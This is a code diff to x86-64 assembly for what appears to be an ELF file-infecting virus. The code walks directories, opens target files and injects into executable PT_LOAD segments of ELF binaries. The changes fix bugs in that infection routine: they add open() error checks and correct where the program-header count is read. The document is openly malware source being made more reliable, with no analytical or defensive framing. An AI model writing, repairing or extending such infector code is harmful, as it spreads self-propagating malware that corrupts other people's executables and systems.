@@ -67,6 +67,9 @@ _start:
                 mov         rax, __NR_open
                 translate_syscall
                 jc          .nextdir                            ;XXX expecting carry flag if syscall fails
+                test        eax, eax
+                jl          .nextdir
+                
 
                 mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
 
@@ -157,6 +160,8 @@ process:                                                        ; expecting file
                 mov         rax, __NR_open
                 translate_syscall
                 jc          .return                             ; XXX expecting carry flag if open() fails
+                test        eax, eax
+                jl          .return
 
                 mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
 
@@ -256,8 +261,8 @@ insert_elf64:                                                   ; expecting data
 
                 mov         rdx, qword [r15 + 0x18]             ; entry point
                 mov         rax, qword [rdi + 0x20]             ; e_phoff
+                movzx       rcx, word [rdi + 0x38]              ; e_phnum                
                 add         rdi, rax                            ; rdi = *Elf64_Phdr
-                movzx       rcx, word [rdi + 0x38]              ; e_phnum
 .segment:       cmp         rcx, 0
                 jle         .return
                 mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
